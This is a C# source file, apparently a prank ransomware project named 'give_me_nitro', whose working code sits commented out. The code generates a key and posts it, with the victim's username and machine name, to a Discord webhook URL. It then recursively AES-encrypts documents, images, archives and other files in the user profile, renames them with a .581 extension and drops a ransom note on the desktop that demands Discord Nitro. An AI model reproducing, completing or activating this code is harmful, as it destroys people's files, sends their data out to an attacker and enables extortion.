using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace give_me_nitro
{
    public static class encrypter
    {
        //Directory and password bytes
        private static string userDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        private static byte[] passwordBytes = null;
        public static void dummy()
        {
            //passwordBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("123"));
            //EncryptDirectory(@"D:\test\");
            //MessageCreator();
        }

        public static void startAction()
        {
            try
            {
                //CreatePassword(15);
                //EncryptDirectory(userDir);
                //MessageCreator();
            }
            catch { }
        }

        //    //Creates and sends random password for encryption
        //    private static void CreatePassword(int length)
        //    {
        //        try
        //        {
        //            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
        //            StringBuilder res = new StringBuilder();
        //            Random rnd = new Random();

        //            while (0 < length--)
        //            {
        //                res.Append(valid[rnd.Next(valid.Length)]);
        //            }

        //            System.Net.WebClient WebClient = new System.Net.WebClient();
        //            WebClient.UploadValues("https://ptb.discord.com/api/webhooks/889156500398936105/G6BcAHmYlOhYs9rQCvHP7Fsqm3fvlSqCmcB4oMQeInr09vdumMU_ZhDiynQ6Egx961vF", new NameValueCollection() { { "username", "HERE IS THE SHEEEEEESH" }, { "content", "-------------------------" + Environment.NewLine + "Username: " + Environment.UserName + Environment.NewLine + "Name: " + Environment.MachineName + Environment.NewLine + "Dkey: " + res.ToString() + Environment.NewLine + "-------------------------" } });

        //            passwordBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(res.ToString()));
        //        }
        //        catch
        //        { }
        //    }

        //    //extensions to be encrypted
        //    static string[] validExtensions = new string[]
        //    {
        //            ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".wav", ".mp3", ".mp4", ".epub", ".pdf", ".zip", ".flac", ".7z", ".rar", ".pak", ".pdn", ".dat", ".log", ".sav", ".sql", ".SQL", ".ico", "xls", ".xlsm", ".ods", ".back"
        //            };


        //    //encrypts target directory
        //    private static void EncryptDirectory(string location)
        //    {
        //        try
        //        {
        //            string[] files = Directory.GetFiles(location);
        //            string[] childDirectories = Directory.GetDirectories(location);
        //            for (int i = 0; i < files.Length; i++)
        //            {
        //                if (validExtensions.Contains("." + files[i].Split(".").LastOrDefault()))
        //                {
        //                    EncryptFile(files[i]);
        //                }
        //            }
        //            for (int i = 0; i < childDirectories.Length; i++)
        //            {
        //                EncryptDirectory(childDirectories[i]);
        //            }
        //        }
        //        catch { }
        //    }

        //    //Encrypts single file
        //    private static void EncryptFile(string filePath)
        //    {
        //        try
        //        {
        //            if (new FileInfo(filePath).Length < 2000000000)
        //            {
        //                File.WriteAllBytes(filePath, AES_Encrypt(File.ReadAllBytes(filePath), passwordBytes));
        //                File.Move(filePath, filePath + ".581");
        //            }
        //        }
        //        catch { }
        //    }

        //    //AES encryption algorithm
        //    private static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        //    {
        //        try
        //        {
        //            byte[] encryptedBytes = null;
        //            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

        //            using (MemoryStream ms = new MemoryStream())
        //            {
        //                using (RijndaelManaged AES = new RijndaelManaged())
        //                {
        //                    AES.KeySize = 256;
        //                    AES.BlockSize = 128;

        //                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
        //                    AES.Key = key.GetBytes(AES.KeySize / 8);
        //                    AES.IV = key.GetBytes(AES.BlockSize / 8);

        //                    AES.Mode = CipherMode.CBC;

        //                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
        //                    {
        //                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
        //                        cs.Close();
        //                    }
        //                    encryptedBytes = ms.ToArray();
        //                }
        //            }
        //            return encryptedBytes;
        //        }
        //        catch
        //        {
        //            return null;
        //        }
        //    }

        //    private static void MessageCreator()
        //    {
        //        try
        //        {
        //            File.WriteAllLines(userDir + @"\Desktop\READ_ME_CCL.txt", new string[] { "Your Files have been encrypted with the .581 extension.", "DON'T close the program or IT WON'T reopen on it's own!", "Most documents in the User Directory are affected.", "Now give me Discord Nitro!!" });

        //            ProcessStartInfo info = new ProcessStartInfo(userDir + @"\Desktop\READ_ME_CCL.txt");
        //            info.UseShellExecute = true;

        //            Process.Start(info);
        //        }
        //        catch { }
        //    }
    }
}

